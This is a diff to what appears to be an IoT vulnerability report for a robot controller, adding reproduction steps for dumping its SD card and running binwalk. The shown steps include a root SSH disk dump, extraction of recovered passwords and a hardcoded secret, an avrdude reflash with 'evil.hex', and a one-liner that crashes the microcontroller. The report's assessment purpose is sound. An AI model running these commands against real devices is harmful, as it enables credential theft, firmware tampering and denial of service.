@@ -35,7 +35,7 @@ void handle_serial() {
 }
 ```
 
-The SD card stores the overlay (and thus the cleartext UCI secrets) with no encryption, and the UART/USB interfaces are unauthenticated and unlocked.
+The SD card stores the overlay (and thus the cleartext UCI secrets) with no encryption, and the UART/USB interfaces are unauthenticated and unlocked. The detailed offline teardown procedure (SD-card dump, binwalk extraction of the Squashfs rootfs, recovery of default passwords, hardcoded keys, and the Arduino `.hex` secrets) is documented in [IoT:I10-FW — Firmware Static Analysis](IoT_Firmware_Static_Analysis.md).
 
 ## Steps to Reproduce
 
@@ -45,6 +45,16 @@ avrdude -c arduino -p atmega328p -P /dev/ttyACM0 -b 115200 -U flash:w:evil.hex:i
 
 # B. Pull the SD card, mount elsewhere, read cleartext secrets
 #    -> etc/config/octobot contains api_key / admin_pass in cleartext
+
+# B'. Full firmware dump + binwalk (no need to disassemble the Pi)
+ssh root@192.168.2.1 'dd if=/dev/mmcblk0 bs=4M | gzip -c' > octobot_sdcard.img.gz
+gunzip -c octobot_sdcard.img.gz | dd of=p2_sample.img bs=1M count=128
+binwalk -e -M p2_sample.img
+# Inspect:
+#   _p2_sample.img.extracted/squashfs-root/etc/shadow        -> blank root password
+#   _p2_sample.img.extracted/squashfs-root/etc/config/rpcd   -> password 'openwrt'
+#   live overlay /etc/config/octobot                         -> api_key / admin_pass
+#   /opt/octobot/firmware/robot_arm.hex -> bin -> strings      -> OctoSuperBot2026
 
 # C. Memory-exhaustion: an unbounded frame grows the String heap until the MCU resets
 python3 -c 'import socket; s=socket.create_connection(("192.168.2.1",2000)); s.sendall(b"S0:"+b"9"*200000)'
@@ -71,4 +81,7 @@ Lock the bootloader and enable read protection where the MCU supports it, disabl
 
 - [ ] Arduino reflashes over USB with no protection
 - [ ] SD card mounted externally exposes cleartext secrets
+- [ ] SD-card dump + binwalk recovers the Squashfs rootfs and live overlay offline
+- [ ] Binwalk extraction reveals blank root password and default `openwrt` password
+- [ ] Static analysis of `robot_arm.hex` recovers `OctoSuperBot2026`
 - [ ] Serial parser accepts an unbounded frame (no length cap on the `String`)
